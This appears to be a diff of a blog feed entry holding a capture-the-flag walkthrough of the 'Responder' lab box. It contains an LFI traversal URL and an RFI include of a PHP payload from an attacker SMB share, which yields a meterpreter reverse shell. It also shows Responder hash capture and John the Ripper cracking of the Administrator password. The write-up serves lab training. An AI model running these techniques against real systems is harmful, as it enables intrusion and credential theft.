@@ -17,6 +17,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>A: unika.htb</p>
+<!-- raw HTML omitted -->
 <h2 id="task2-which-scripting-language-is-being-used-on-the-server-to-generate-webpages">Task2: Which scripting language is being used on the server to generate webpages?</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -65,23 +66,31 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>A: PHP</p>
+<!-- raw HTML omitted -->
 <h2 id="task3-what-is-the-name-of-the-url-parameter-which-is-used-to-load-different-language-versions-of-the-webpage">Task3: What is the name of the URL parameter which is used to load different language versions of the webpage?</h2>
 <p>A: page</p>
+<!-- raw HTML omitted -->
 <h2 id="task4-which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-local-file-include-lfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Task4: Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h2>
 <p>I was able to exploit LFI like so:</p>
 <p><code>http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</code></p>
 <p>A: <a href="http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts" target="_blank" rel="noopener noreffer">http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</a></p>
+<!-- raw HTML omitted -->
 <h2 id="task5-which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-remote-file-include-rfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Task5: Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h2>
 <p>A: //10.10.14.6/somefile</p>
+<!-- raw HTML omitted -->
 <h2 id="task6-what-does-ntlm-stand-for">Task6: What does NTLM stand for?</h2>
 <p>A: New Technology LAN Manager</p>
+<!-- raw HTML omitted -->
 <h2 id="task7-which-flag-do-we-use-in-the-responder-utility-to-specify-the-network-interface">Task7: Which flag do we use in the Responder utility to specify the network interface?</h2>
 <p>A: -I</p>
+<!-- raw HTML omitted -->
 <h2 id="task8-there-are-several-tools-that-take-a-netntlmv2-challengeresponse-and-try-millions-of-passwords-to-see-if-any-of-them-generate-the-same-response-one-such-tool-is-often-referred-to-as-john-but-the-full-name-is-what">Task8: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?.</h2>
 <p>A: John the Ripper</p>
+<!-- raw HTML omitted -->
 <h2 id="task9-what-is-the-password-for-the-administrator-user">Task9: What is the password for the administrator user?</h2>
 <p>I was able to run responder and capture hashes by using RFI like mentioned in the bonus section to sideload the php meterpreter file and gaining a shell.</p>
 <p>Responder was then able to capture hashes.</p>
+<!-- raw HTML omitted -->
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -224,8 +233,11 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>After pointing my browser to <code>http://unika.htb/index.php?page=\\10.10.16.156\ica\payload.php</code></p>
+</div><!-- raw HTML omitted -->
+<p>After pointing my browser to <code>http://unika.htb/index.php?page=\\10.10.16.156\ica\payload.php</code></p>
+<!-- raw HTML omitted -->
 <p>I can capture a connection and dump NTLMv2 hashes:</p>
+<!-- raw HTML omitted -->
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -246,7 +258,9 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>I saved the ntlm2 hash to a file <code>ntlm2_hash</code> and now I will try to crack the hash using John the Ripper!</p>
+</div><!-- raw HTML omitted -->
+<p>I saved the ntlm2 hash to a file <code>ntlm2_hash</code> and now I will try to crack the hash using John the Ripper!</p>
+<!-- raw HTML omitted -->
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -271,12 +285,15 @@
 </span></span><span class="line"><span class="cl">Session completed.
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>I am using the password list
+</div><!-- raw HTML omitted -->
+<p>I am using the password list
 <code>rockyou.txt</code> here because it contains the most commonly used passwords.</p>
 <p><code>john</code> was immediately able to crack the hash.</p>
 <p>The password of the <code>Administrator</code> account is <code>badminton</code></p>
+<!-- raw HTML omitted -->
 <h2 id="task10-well-use-a-windows-service-ie-running-on-the-box-to-remotely-access-the-responder-machine-using-the-password-we-recovered-what-port-tcp-does-it-listen-on">Task10: We&rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</h2>
 <p>A: 5985</p>
+<!-- raw HTML omitted -->
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -383,9 +400,12 @@
 </span></span><span class="line"><span class="cl">45107/tcp open  unknown
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>On port 5985 is the service <code>wsman</code> running. wsman stands for WS-Management. This is a WinRM service. This provides access to Web Services for Management.</p>
+</div><!-- raw HTML omitted -->
+<p>On port 5985 is the service <code>wsman</code> running. wsman stands for WS-Management. This is a WinRM service. This provides access to Web Services for Management.</p>
+<!-- raw HTML omitted -->
 <h2 id="submit-root-flag">Submit root flag</h2>
 <p>Let&rsquo;s get the latest versions of Responder and Evil-WinRm!</p>
+<!-- raw HTML omitted -->
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -398,7 +418,9 @@
 </span></span><span class="line"><span class="cl">git clone https://github.com/Hackplayers/evil-winrm
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Next run Responder so it can listen for requests.</p>
+</div><!-- raw HTML omitted -->
+<p>Next run Responder so it can listen for requests.</p>
+<!-- raw HTML omitted -->
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -545,7 +567,9 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Next we need to connect with evil-winrm to the winrm service running on the target machine!</p>
+</div><!-- raw HTML omitted -->
+<p>Next we need to connect with evil-winrm to the winrm service running on the target machine!</p>
+<!-- raw HTML omitted -->
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -658,12 +682,15 @@
 </span></span><span class="line"><span class="cl">ea81b7afddd03efaa0945333ed147fac
 </span></span></code></pre></td></tr></table>
 </div>
-</div><hr>
+</div><!-- raw HTML omitted -->
+<hr>
 <p><strong>root flag: ea81b7afddd03efaa0945333ed147fac</strong></p>
 <hr>
+<!-- raw HTML omitted -->
 <h2 id="bonus">Bonus</h2>
 <p><strong>(this section was not part of this box. However I went one step further and gained a meterpreter shell by exploiting RFI using Samba)</strong></p>
 <hr>
+<!-- raw HTML omitted -->
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -682,8 +709,10 @@
 </span></span><span class="line"><span class="cl">Saved as: payload.php
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>We will need to exploit this using Samba since url_fopen is disabled in php we cannot easily exploit RFI here.
-(<a href="https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener noreffer">https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a>)</p>
+</div><!-- raw HTML omitted -->
+<p>We will need to exploit this using Samba since url_fopen is disabled in php we cannot easily exploit RFI here.
+(<!-- raw HTML omitted --><a href="https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener noreffer">https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a><!-- raw HTML omitted -->)</p>
+<!-- raw HTML omitted -->
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -754,7 +783,9 @@
 </span></span><span class="line"><span class="cl">cp payload.php /var/www/html/pub
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>After executing the payload by browsing to <code>http://unika.htb/index.php?page=\\10.10.16.156\ica\payload.php</code> I got a meterpreter shell!</p>
+</div><!-- raw HTML omitted -->
+<p>After executing the payload by browsing to <code>http://unika.htb/index.php?page=\\10.10.16.156\ica\payload.php</code> I got a meterpreter shell!</p>
+<!-- raw HTML omitted -->
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -771,4 +802,6 @@
 </span></span><span class="line"><span class="cl">meterpreter &gt;
 </span></span></code></pre></td></tr></table>
 </div>
-</div>]]></description></item></channel></rss>
+</div><p>That&rsquo;s it!</p>
+<p>Thanks for tuning in !</p>
+]]></description></item></channel></rss>
